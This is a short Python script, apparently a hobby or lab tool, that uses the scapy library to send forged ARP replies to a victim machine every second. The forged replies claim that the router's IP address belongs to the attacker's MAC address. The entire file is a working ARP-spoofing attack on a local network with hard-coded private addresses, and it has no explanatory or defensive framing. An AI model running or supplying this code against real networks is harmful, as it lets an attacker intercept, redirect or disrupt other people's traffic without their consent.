import time
from scapy.all import *

my_ip = "192.168.1.161"
my_mac = "e8:9c:25:4c:02:de"

victim_ip = "192.168.1.145"
victim_mac = "9a:cd:7e:d0:0b:6d"

router_ip = "192.168.1.1"
router_mac = "20:b0:01:36:b4:a0"

while True:
    victim_packet = Ether(dst=victim_mac) / ARP(op = 2, psrc = router_ip, pdst = victim_ip, hwdst = victim_mac, hwsrc = my_mac)
    print(victim_packet)
    sendp(victim_packet)
    time.sleep(1)